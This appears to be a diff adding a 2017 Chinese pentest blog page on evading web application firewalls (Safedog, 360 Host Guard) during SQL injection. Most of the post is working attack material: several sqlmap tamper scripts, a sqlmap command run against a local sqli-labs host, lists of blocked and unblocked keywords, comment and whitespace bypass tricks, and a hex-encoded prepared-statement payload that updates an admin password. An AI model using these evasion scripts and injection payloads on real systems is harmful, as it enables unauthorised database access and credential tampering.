@@ -1,0 +1,612 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>bypass firewall | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="狗的绕过比较简单，还是写一下：
+https://secvul.com/topics/876.htmlhttp://www.freebuf.com/articles/network/150646.html
+根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: /**a**/，tamper.py如下：
+#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;env python
+
+&amp;quot;&amp;quot;&amp;quot;
+Copyright (c) 2006-2017 sqlmap developers (http:&amp;#x2F;&amp;#x2F;sqlmap.org&amp;#x2F;)
+See the file &amp;#39;doc&amp;#x2F;COPYING&amp;#39; for copying permission
+&amp;quot;&amp;quot;&amp;quot;
+
+from lib.core.enums import PRIORITY
+
+__priority__ &amp;#x3D; PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    &amp;quot;&amp;quot;&amp;quot;
+    Replaces space character (&amp;#39; &amp;#39;) with comments &amp;#39;&amp;#x2F;**&amp;#x2F;&amp;#39;
+
+    Tested against:
+        * Microsoft SQL Server 2005
+        * MySQL 4, 5.0 and 5.5
+        * Oracle 10g
+        * PostgreSQL 8.3, 8.4, 9.0
+
+    Notes:
+        * Useful to bypass weak and bespoke web application firewalls
+
+    &amp;gt;&amp;gt;&amp;gt; tamper(&amp;#39;SELECT id FROM users&amp;#39;)
+    &amp;#39;SELECT&amp;#x2F;**&amp;#x2F;id&amp;#x2F;**&amp;#x2F;FROM&amp;#x2F;**&amp;#x2F;users&amp;#39;
+    &amp;quot;&amp;quot;&amp;quot;
+
+    retVal &amp;#x3D; payload
+
+    if payload:
+        retVal &amp;#x3D; &amp;quot;&amp;quot;
+        quote, doublequote, firstspace &amp;#x3D; False, False, False
+
+        for i in xrange(len(payload)):
+            if not firstspace:
+                if payload[i].isspace():
+                    firstspace &amp;#x3D; True
+                    retVal +&amp;#x3D; &amp;quot;&amp;#x2F;**s**&amp;#x2F;&amp;quot;
+                    continue
+
+            elif payload[i] &amp;#x3D;&amp;#x3D; &amp;#39;\&amp;#39;&amp;#39;:
+                quote &amp;#x3D; not quote
+
+            elif payload[i] &amp;#x3D;&amp;#x3D; &amp;#39;&amp;quot;&amp;#39;:
+                doublequote &amp;#x3D; not doublequote
+
+            elif payload[i] &amp;#x3D;&amp;#x3D; &amp;quot; &amp;quot; and not doublequote and not quote:
+                retVal +&amp;#x3D; &amp;quot;&amp;#x2F;**s**&amp;#x2F;&amp;quot;
+                continue
+
+            retVal +&amp;#x3D; payload[i]
+
+    return retVal
+米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：首先是修改tamper:
+#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;env python
+
+&amp;quot;&amp;quot;&amp;quot;
+Copyright (c) 2006-2017 sqlmap developers (http:&amp;#x2F;&amp;#x2F;sqlmap.org&amp;#x2F;)
+See the file &amp;#39;LICENSE&amp;#39; for copying permission
+&amp;quot;&amp;quot;&amp;quot;
+
+import os
+import re
+
+from lib.core.common import singleTimeWarnMessage
+from lib.core.data import kb
+from lib.core.enums import DBMS
+from lib.core.enums import PRIORITY
+from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
+
+__priority__ &amp;#x3D; PRIORITY.HIGHER
+
+def dependencies():
+    singleTimeWarnMessage(&amp;quot;tamper script &amp;#39;%s&amp;#39; is only meant to be run against %s &amp;lt; 5.1&amp;quot; % (os.path.basename(__file__).split(&amp;quot;.&amp;quot;)[0], DBMS.MYSQL))
+
+def tamper(payload, **kwargs):
+    &amp;quot;&amp;quot;&amp;quot;
+    Adds versioned MySQL comment before each keyword
+
+    Requirement:
+        * MySQL &amp;lt; 5.1
+
+    Tested against:
+        * MySQL 4.0.18, 5.0.22
+
+    Notes:
+        * Useful to bypass several web application firewalls when the
+          back-end database management system is MySQL
+        * Used during the ModSecurity SQL injection challenge,
+          http:&amp;#x2F;&amp;#x2F;modsecurity.org&amp;#x2F;demo&amp;#x2F;challenge.html
+
+    &amp;gt;&amp;gt;&amp;gt; tamper(&amp;quot;value&amp;#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &amp;#39;QDWa&amp;#39;&amp;#x3D;&amp;#39;QDWa&amp;quot;)
+    &amp;quot;value&amp;#39;&amp;#x2F;*!0UNION&amp;#x2F;*!0ALL&amp;#x2F;*!0SELECT&amp;#x2F;*!0CONCAT(&amp;#x2F;*!0CHAR(58,107,112,113,58),&amp;#x2F;*!0IFNULL(CAST(&amp;#x2F;*!0CURRENT_USER()&amp;#x2F;*!0AS&amp;#x2F;*!0CHAR),&amp;#x2F;*!0CHAR(32)),&amp;#x2F;*!0CHAR(58,97,110,121,58)),&amp;#x2F;*!0NULL,&amp;#x2F;*!0NULL#&amp;#x2F;*!0AND &amp;#39;QDWa&amp;#39;&amp;#x3D;&amp;#39;QDWa&amp;quot;
+    &amp;quot;&amp;quot;&amp;quot;
+
+    def process(match):
+        word &amp;#x3D; match.group(&amp;#39;word&amp;#39;)
+        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
+            return match.group().replace(word, &amp;quot;&amp;#x2F;*!50001%s*&amp;#x2F; &amp;quot; % word)
+        else:
+            return match.group()
+
+    retVal &amp;#x3D; payload
+
+    if payload:
+        retVal &amp;#x3D; re.sub(r&amp;quot;(?&amp;lt;&amp;#x3D;\W)(?P&amp;lt;word&amp;gt;[A-Za-z_]+)(?&amp;#x3D;\W|\Z)&amp;quot;, lambda match: process(match), retVal)
+        retVal &amp;#x3D; retVal.replace(&amp;quot; &amp;#x2F;*!50001*&amp;#x2F;&amp;quot;, &amp;quot;&amp;#x2F;*!50001*&amp;#x2F;&amp;quot;)
+
+    return retVal
+
+
+注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句
+
+比如mysql版本是5.5.53:
+
+select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;
+
+这个语句是可以执行成功的，如果50553变成50554则执行失败"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="bypass firewall"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> bypass firewall</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>狗的绕过比较简单，还是写一下：</p>
+<p><a target="_blank" rel="noopener" href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
+<p>根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: <code>/**a**/</code>，tamper.py如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+
+&quot;&quot;&quot;
+Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
+See the file &#39;doc&#x2F;COPYING&#39; for copying permission
+&quot;&quot;&quot;
+
+from lib.core.enums import PRIORITY
+
+__priority__ &#x3D; PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    &quot;&quot;&quot;
+    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;
+
+    Tested against:
+        * Microsoft SQL Server 2005
+        * MySQL 4, 5.0 and 5.5
+        * Oracle 10g
+        * PostgreSQL 8.3, 8.4, 9.0
+
+    Notes:
+        * Useful to bypass weak and bespoke web application firewalls
+
+    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;
+    &quot;&quot;&quot;
+
+    retVal &#x3D; payload
+
+    if payload:
+        retVal &#x3D; &quot;&quot;
+        quote, doublequote, firstspace &#x3D; False, False, False
+
+        for i in xrange(len(payload)):
+            if not firstspace:
+                if payload[i].isspace():
+                    firstspace &#x3D; True
+                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
+                    continue
+
+            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
+                quote &#x3D; not quote
+
+            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
+                doublequote &#x3D; not doublequote
+
+            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
+                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
+                continue
+
+            retVal +&#x3D; payload[i]
+
+    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：<br>首先是修改tamper:</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+
+&quot;&quot;&quot;
+Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
+See the file &#39;LICENSE&#39; for copying permission
+&quot;&quot;&quot;
+
+import os
+import re
+
+from lib.core.common import singleTimeWarnMessage
+from lib.core.data import kb
+from lib.core.enums import DBMS
+from lib.core.enums import PRIORITY
+from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
+
+__priority__ &#x3D; PRIORITY.HIGHER
+
+def dependencies():
+    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))
+
+def tamper(payload, **kwargs):
+    &quot;&quot;&quot;
+    Adds versioned MySQL comment before each keyword
+
+    Requirement:
+        * MySQL &lt; 5.1
+
+    Tested against:
+        * MySQL 4.0.18, 5.0.22
+
+    Notes:
+        * Useful to bypass several web application firewalls when the
+          back-end database management system is MySQL
+        * Used during the ModSecurity SQL injection challenge,
+          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html
+
+    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)
+    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;
+    &quot;&quot;&quot;
+
+    def process(match):
+        word &#x3D; match.group(&#39;word&#39;)
+        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
+            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)
+        else:
+            return match.group()
+
+    retVal &#x3D; payload
+
+    if payload:
+        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)
+        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)
+
+    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句</p>
+</blockquote>
+<p>比如mysql版本是5.5.53:</p>
+<blockquote>
+<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
+</blockquote>
+<p>这个语句是可以执行成功的，如果50553变成50554则执行失败</p>
+<p>由于主机卫士会拦截cast，修改sqlmap的配置文件:<code>sqlmap/xml/queries.xml</code>,先备份，然后修改第6行的内容<code>&lt;cast query=&quot;CAST(%s AS CHAR)&quot;/&gt;</code>，修改为<code>&lt;cast query=&quot;%s&quot;/&gt;</code>。</p>
+<p>这个时候，在注入的时候需要指定<code>--technique</code>为E或者U，盲注在这种情况下是不行的，因为会拦截ord函数。</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http:&#x2F;&#x2F;192.168.141.200&#x2F;sqli-labs&#x2F;Less-1&#x2F;index.php\?id\&#x3D;1 --tamper fuck360.py -v 3 --dbs    --union-col 3 --threads 5 --password --technique E --flush-session<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>盲注bypass的尝试:</p>
+<ul>
+<li>在<code>sqlmap/txt/keywords.txt</code>里面添加了<code>SLEEP</code>，就是在注入的时候，添加SLEEP为关键词注释掉</li>
+</ul>
+<p>因为在注入的时候同样使用了ord函数。<br>盲注的函数，</p>
+<pre class="line-numbers language-none"><code class="language-none">pow() 计算平方的，对于字母来说貌似结果都一样 pass
+pi()
+exp() 以e为底的指函数
+ceil() 向上取整
+sqrt() 给定值的平方根
+floor() 向下取整
+ceiling() 向上取整<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>被拦截的函数，</p>
+<pre class="line-numbers language-none"><code class="language-none">ascii()
+hex()
+unhex()
+ord()
+char()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>参考<a target="_blank" rel="noopener" href="http://www.cnblogs.com/xiaozi/p/7275134.html">http://www.cnblogs.com/xiaozi/p/7275134.html</a>这篇文章里面的替换:</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+
+&quot;&quot;&quot;
+write by Aaron
+&quot;&quot;&quot;
+from lib.core.enums import PRIORITY
+from lib.core.settings import UNICODE_ENCODING
+__priority__ &#x3D; PRIORITY.LOW
+def dependencies():
+    pass
+def tamper(payload, **kwargs):
+    &quot;&quot;&quot;
+    Replaces keywords
+    &gt;&gt;&gt; tamper(&#39;UNION SELECT id FROM users&#39;)
+    &#39;union%0a&#x2F;*!12345select*&#x2F;id%0a&#x2F;*!12345from*&#x2F;users&#39;
+    &quot;&quot;&quot;
+    if payload:
+        payload&#x3D;payload.replace(&quot; ALL SELECT &quot;,&quot;%0a&#x2F;*!12345select*&#x2F;&quot;)
+        payload&#x3D;payload.replace(&quot;UNION SELECT&quot;,&quot;union%0a&#x2F;*!12345select*&#x2F;&quot;)
+        payload&#x3D;payload.replace(&quot; FROM &quot;,&quot;%0a&#x2F;*!12345from*&#x2F;&quot;)
+        payload&#x3D;payload.replace(&quot;CONCAT&quot;,&quot;CONCAT%23%0a&quot;)
+        payload&#x3D;payload.replace(&quot;CASE &quot;,&quot;CASE%23%0a&quot;)
+        payload&#x3D;payload.replace(&quot;CAST(&quot;,&quot;&#x2F;*!12345CASt(*&#x2F;&quot;)
+        payload&#x3D;payload.replace(&quot;DATABASE()&quot;,&quot;database%0a()&quot;)
+                
+    return payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>所以只要把ORD函数給注释包含就可以。</p>
+<p>网站卫士和主机卫士不同，貌似网站卫士更严格。测试下如何绕过。</p>
+<p>主机卫士不是最新版，fucck</p>
+<p>###预编译注入<br>set @x=0x73656c656374202a2066726f6d206d7973716c2e757365723b;prepare a from @x;execute a;<br>prepare a from ‘select user()’;execute a;</p>
+<p>一般情况下PDO只会返回第一条SQL语句的结果，一般执行一个update语句，将需要的数据更新到某个可见的字段中，或者使用sleep盲注。</p>
+<p>set(@x=757064617465207573657220736574207077643D31313120776865726520757365726E616D653D2761646D696E27);prepare(a)from(@x);execute(a)</p>
+<p>set @x=0x73656c656374202a2066726f6d206d7973716c2e757365723b;prepare a from @x;execute a;<br>prepare a from ‘select user()’;execute a;</p>
+<p>union select 拦截<br>select union 不拦截<br>select from 拦截<br>select all 不拦截<br>updatexml select 拦截</p>
+<p>注释:</p>
+<pre class="line-numbers language-none"><code class="language-none">#
+-- 
+-- -
+--+
+&#x2F;&#x2F;
+&#x2F;**&#x2F;
+&#x2F;*abcd*&#x2F;
+;%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>空白字符：</p>
+<p>09 0A 0B 0C 0D A0 20</p>
+<p>字符串连接函数:<br>concat<br>concat_ws</p>
+<p>除去GET以外，其他过滤最弱。</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;1|@pwd:&#x3D;(select user from users where 
+id&#x3D;4)&#x2F;*ddd*&#x2F;union&#x2F;*ddd*&#x2F;select null,@pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">union select 拦截
+select from 拦截
+updatexml select 拦截
+select all from 拦截
+select distinct from 拦截
+select distinctrow from 拦截
+
+select all union 不拦截
+select all 不拦截
+select union 不拦截 
+union from 不拦截
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/10/30/bypass-sql-firewall.html" class="leancloud-visitors view" data-flag-title="bypass firewall">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/11/02/naxsi.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/10/25/naxsi-elk.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-10-30 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
